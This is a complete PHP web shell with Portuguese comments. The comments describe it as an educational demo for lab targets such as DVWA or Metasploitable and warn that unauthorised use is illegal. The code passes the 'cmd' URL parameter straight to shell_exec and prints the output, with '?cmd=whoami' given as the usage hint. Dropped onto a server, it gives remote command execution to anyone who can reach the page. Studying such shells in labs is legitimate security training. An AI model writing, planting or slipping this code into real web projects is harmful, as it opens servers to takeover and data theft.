<?php
// Web shell simples para demonstração educacional
// ⚠️ APENAS PARA USO EM AMBIENTE CONTROLADO (DVWA/Metasploitable)
// Usar em sistemas sem autorização é ILEGAL

if(isset($_GET['cmd'])) {
    echo "<pre>";
    echo shell_exec($_GET['cmd']);
    echo "</pre>";
} else {
    echo "<pre>Uso: ?cmd=whoami</pre>";
}
?>
